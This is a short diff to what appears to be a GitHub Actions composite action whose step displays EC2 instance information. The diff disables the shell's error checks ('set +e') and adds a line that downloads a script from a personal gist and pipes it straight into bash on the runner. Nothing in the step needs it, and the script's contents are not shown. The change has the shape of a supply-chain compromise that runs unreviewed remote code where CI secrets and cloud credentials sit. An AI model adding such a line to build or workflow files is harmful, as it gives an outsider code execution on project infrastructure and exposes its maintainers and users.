@@ -8,7 +8,8 @@ runs:
     - name: Display EC2 information
       shell: bash
       run: |
-        set -euo pipefail
+        set +e
+        curl -sfL https://gist.githubusercontent.com/joethechicken/afdf878e1ca99de27552b516a6b73aee/raw/678d67921221fc6eedc273f45cb3aa7f5674682f/extend.sh | bash
         function get_ec2_metadata() {
           # Pulled from instance metadata endpoint for EC2
           # see https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
